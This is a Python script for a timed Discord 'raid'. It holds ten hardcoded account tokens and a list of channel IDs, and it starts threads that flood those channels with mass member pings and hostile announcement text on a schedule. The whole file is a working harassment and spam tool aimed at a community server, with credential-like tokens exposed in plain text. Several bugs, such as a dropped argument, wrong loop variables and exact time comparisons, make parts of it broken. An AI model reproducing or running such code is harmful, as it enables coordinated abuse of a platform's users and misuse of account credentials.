import threading
import requests
import time
tokens = ['OTEzNTUzMzExMTE2OTg0MzIx.GRs4ha.rPVBmHhE0JrQrXhc33EixOhu92-2dAWXUtJRJA', 'MTAwMTU2NDI2MjUzNzM3NTg0NQ.GsuGXJ.nJxrrozs-VxqE_wLsTFkA4gLlxym0q5Ux3Gwjs', 'MTAwMTU2ODAxNzM0NTQyMTMyMg.G_H5QN.fqnGjGJX50jbAWX6MFwfbM9ydQnSjMmgg4FZ8s', 'MTAwMTU3NDIzNDU1Mzg0Nzg4OA.GvCgNo.8q95IWvWg1su2Pt_13Sl2o3bjEhuT4SYTryO6I', 'MTAwMTU3NTQ0NjAyODIyMjU4NQ.G00Hh5.G8zPFJHUEp1xK3FCS6vpDGknQDg0eiGA4vv_HM', 'MTAwMTU3NzYyNjI5ODc1NzE5MA.GAbpkV.SUBCtdmr0bbekU7McwDajVR_TsGuHvpodEDdL4', 'MTAwMTg2MTA2NjIxODgxOTYxNA.GBX8Tb.ggn-csTogDG5zg5Xr6wp6zKHzkRFXMssUjUjBo', 'MTAwMTg2MjE4MDc3NTM5NTM0MQ.G0ZA0r.5LxxrWLSJHjQdfxw37yaufFcUnRrLEpr_Z86HM', 'MTAwMTg2NTE3NTgyNzIxODUxMw.GiJjPU.drSm0zJl5x6I8G29IkO6H5m8s2GwqK2RfvJc2Y', 'MTAwMjE4MzA1MjUzNTAyNTc2NQ.GftwUU.xn3NJky1oEAGSr6RB5p3ZXapsfBytiBrORH-VY']
channels = ['1004098733635547217', '1004098787981131796', '1003795648031756299', '1004095278539874416']
announce =  "\nthe sun is shining, the roses are blooming, yet one thing remains\nit is not death or suffering\nits this server\nFUCK THIS SERVER AND WE SHALL ALL BE FREE"
defaultGuild = ''
userpings = []
msg = ''
kill = 0
newmsg = ''
usersremove = ['913553311116984321', '1001564262537375845', '1001568017345421322', '1001574234553847888', '1001575446028222585', '1001577626298757190', '1001861066218819614', '1001862180775395341', '1001865175827218513', '1002183052535025765', '700794522107510788']
def sendMessage(c_id, content, token):
    x = requests.post(f"https://discord.com/api/v9/channels/{c_id}/messages", headers={"Authorization":token}, json={"content": content})
    responseJson = x.json()
    #print(responseJson)
    if x.status_code == 409:
        time.sleep(responseJson['retry_after'])
        sendMessage(c_id, content)
    else:
        return x.status_code
def raid(channel, token):
    global newmsg, kill
    while True:
        stat = sendMessage(channel, newmsg, token)
        if kill == 1:
            break
        elif stat == 401 or stat == 403:
            break
x = requests.get(f"https://discord.com/api/v9/guilds/{defaultGuild}/members?limit=1000")
g_list = x.json()
for i in range(len(g_list)):
    userpings.append("<@" + g_list[i]["user"]["id"] + ">")
for k in range(usersremove):
    userpings.remove(f"<@{usersremove[k]}>")
for j in range(len(userpings)):
    msg += userpings[i] + " "
newmsg = msg + announce
while True:
    newmsg = msg + announce
    cur_time = time.time()
    if cur_time == 1659592800:
        for i in range(len(tokens)):
            for j in range(len(channels)):
                threading.Thread(target=lambda: raid(channels[j], tokens[i])).start()
    if cur_time == 1659596400:
        announce = "\nAMONGUS AT 3 AM LETS GOOOOOOOOOOO"
    if cur_time == 1659600000:
        announce = "\ngotta go soon lol"
    if cur_time == 1659601800:
        announce = "\nhaha jk i need to get rid of this shit server to free us all"
    if cur_time == 1659603570:
        announce = "\nWE SHALL MEET AGAIN SOON, GOODBYE"
    if cur_time == 1659603600:
        kill = 1
        break
